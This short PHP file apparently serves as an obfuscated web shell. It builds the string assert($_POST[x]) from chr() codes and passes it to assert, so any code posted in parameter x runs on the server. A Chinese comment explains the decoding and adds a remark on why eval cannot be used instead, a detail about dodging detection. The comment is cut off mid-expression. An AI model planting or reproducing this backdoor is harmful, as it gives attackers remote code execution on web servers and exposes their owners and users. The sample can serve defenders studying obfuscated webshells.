<?php 
assert(chr(97).chr(115).chr(115).chr(101).chr(114).chr(116).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(120).chr(93).chr(41)); // chr解出来是assert($_POST[x])，不能替换成eval(chr(97).chr(115)
?>
